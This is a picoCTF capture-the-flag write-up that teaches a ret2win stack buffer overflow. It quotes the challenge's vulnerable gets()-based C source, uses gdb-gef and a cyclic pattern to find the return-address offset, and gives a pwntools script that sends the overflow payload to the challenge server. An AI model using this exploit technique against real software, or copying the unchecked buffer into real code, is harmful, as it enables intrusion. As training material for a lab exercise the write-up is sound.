# picoCTF: Buffer overflow 1
### Description
Control the return address \
Now we're cooking! You can overflow the buffer and return to the flag function in the  [program](https://artifacts.picoctf.net/c/253/vuln). \
You can view source [here](https://artifacts.picoctf.net/c/253/vuln.c). And connect with it using  `nc saturn.picoctf.net [PORT]`

Let's check out our source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

In the `vuln()` function, we see that once again, the `gets()` function is being used. However, instead of triggering a segmentation fault like <kbd>Buffer overflow 0</kbd>, we will instead utilize its vulnerability to write our own addresses onto the stack, changing the return address to `win()` instead.

### Part I: Explaining the Stack

Before we get into the code, we need to figure out how to write our own addresses to the stack. Let's start with a visual:

![Stack Visualization](https://enscribe.dev/asset/pico/buffer-overflow-0-1/stack-visual.png)

Whenever we call a function, multiple items will be "pushed" onto the **top** of the stack (in the diagram, that will be on the right-most side). It will include any parameters, a return address back to `main()`, a base pointer, and a buffer. Note that the stack grows **downwards**, towards lower memory addresses, but the buffer is written **upwards**, towards higher memory addresses.

We can "smash the stack" by exploiting the `gets()` function. If we pass in a large enough input, it will overwrite the entire buffer and start overflowing into the base pointer and return address within the stack:

![Overflow Visualization](https://enscribe.dev/asset/pico/buffer-overflow-0-1/overflow-visual.png)

If we are delibrate of the characters we pass into `gets()`, we will be able to insert a new address to overwrite the return address to `win()`. Let's try!

### Part II: Smashing the Stack

To start, we first need to figure out our "offset". The offset is the distance, in characters, between the beginning of the buffer and the position of the `$eip`. This can be visualized with the `gdb-gef` utility by setting a breakpoint (a place to pause the runtime) in the `main()` function:

```text
gef➤  b main
Breakpoint 1 at 0x80492d7
gef➤  r
Starting program: /home/kali/pico22/buffer-overflow-1/vuln 

Breakpoint 1, 0x080492d7 in main ()
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0xf7fa89e8  →  0xffffd1cc  →  0xffffd39c  →  "SHELL=/usr/bin/bash"
$ebx   : 0x0       
$ecx   : 0xffffd120  →  0x00000001
$edx   : 0xffffd154  →  0x00000000
$esp   : 0xffffd100  →  0xffffd120  →  0x00000001
$ebp   : 0xffffd108  →  0x00000000
$esi   : 0x1       
$edi   : 0x80490e0  →  <_start+0> endbr32 
$eip   : 0x80492d7  →  <main+19> sub esp, 0x10
...
─────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80492d3 <main+15>        mov    ebp, esp
    0x80492d5 <main+17>        push   ebx
    0x80492d6 <main+18>        push   ecx
 →  0x80492d7 <main+19>        sub    esp, 0x10
    0x80492da <main+22>        call   0x8049130 <__x86.get_pc_thunk.bx>
    0x80492df <main+27>        add    ebx, 0x2d21
    0x80492e5 <main+33>        mov    eax, DWORD PTR [ebx-0x4]
    0x80492eb <main+39>        mov    eax, DWORD PTR [eax]
    0x80492ed <main+41>        push   0x0
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x80492d7 in main (), reason: BREAKPOINT
```

Analyzing this breakpoint, if you look at the arrow on the assembly code, you can see that its address is the exact same as the `$eip` (`0x80492d7`). Let's try overflowing this register by passing an unhealthy amount of `A`s into the program:

```text
gef➤  r
Starting program: /home/kali/pico22/buffer-overflow-1/vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers Crossed... Jumping to 0x41414141

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0x41      
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0x41      
$edx   : 0xffffffff
$esp   : 0xffffd0f0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x1       
$edi   : 0x80490e0  →  <_start+0> endbr32 
$eip   : 0x41414141 ("AAAA"?)
...
─────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x41414141 in ?? (), reason: SIGSEGV
```

Look what happened: our program threw a SIGSEGV (segmentation) fault, as it is trying to reference the address `0x41414141`, which doesn't exist! This is because our `$eip` was overwritten by all our `A`s (`0x41` in ASCII = `A` in text).

### Part III: Smashing the Stack (with finesse)

Although we've managed to smash the stack, we still dont' know the offset (**how many** `A`s we need to pass in order to reach the `$eip`). To solve this problem, we can use the pwntools `cyclic` command, which creates a string with a recognizable cycling pattern for it to identify:

```text
gef➤  shell cyclic 150
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
gef➤  r
Starting program: /home/kali/pico22/buffer-overflow-1/vuln 
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0x41      
$ebx   : 0x6161616a ("jaaa"?)
$ecx   : 0x41      
$edx   : 0xffffffff
$esp   : 0xffffd0f0  →  "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0x1       
$edi   : 0x80490e0  →  <_start+0> endbr32 
$eip   : 0x6161616c ("laaa"?)
...
─────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
```

We can see that `$eip` is currently overflowed with the pattern `0x6161616c` (`laaa`). let's search for this pattern using `pattern search`:

```text
gef➤  pattern search 0x6161616c
[+] Searching for '0x6161616c'
[+] Found at offset 44 (little-endian search) likely
[+] Found at offset 41 (big-endian search)
```

To figure out which offset we need to use, we can use `readelf` to analyze header of the `vuln` executable:

```text
kali@kali:~/pico22/buffer-overflow-1$ readelf -h vuln | grep endian
  Data:                              2's complement, little endian
```

Our binary is in little endian, we know that 44 `A`s are needed in order to reach the `$eip`. The only thing we need now before we create our exploit is the address of the `win()` function, which will be appended to the end of our buffer to overwrite the `$eip` on the stack:

```text
gef➤  x win
0x80491f6 <win>: 0xfb1e0ff3
```

Win is at `0x80491f6`, but we need to convert it to the little endian format. You can do this with the pwntools `p32()` command, which results in `\xf6\x91\x04\x08`.
Let's make a final visual of our payload:

![Payload Visual](https://enscribe.dev/asset/pico/buffer-overflow-0-1/payload-visual.png)

Let's write our payload and send it to the remote server with Python3/pwntools:

```py
from pwn import *
payload = b"A"*44 + p32(0x80491f6)        # Prints the address as little endian (b'\xf6\x91\x04\x08').
host, port = "saturn.picoctf.net", [PORT]

p = remote(host, port)                    # Opens the connection
log.info(p.recvS())                       # Decodes/prints "Please enter your string:"
p.sendline(payload)                       # Sends the payload
log.success(p.recvallS())                 # Decodes/prints all program outputs
p.close()                                 # Closes the connection
```

Let's try running the script on the server:

```text
kali@kali:~/pico22/buffer-overflow-1$ python3 exp.py
[+] Opening connection to saturn.picoctf.net on port [PORT]: Done
[*] Please enter your string: 
[+] Receiving all data: Done (100B)
[*] Closed connection to saturn.picoctf.net port [PORT]
[+] Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
    picoCTF{addr3ss3s_ar3_3asy_********}
```

You have completed your first `ret2win` buffer overflow on a x32 binary!
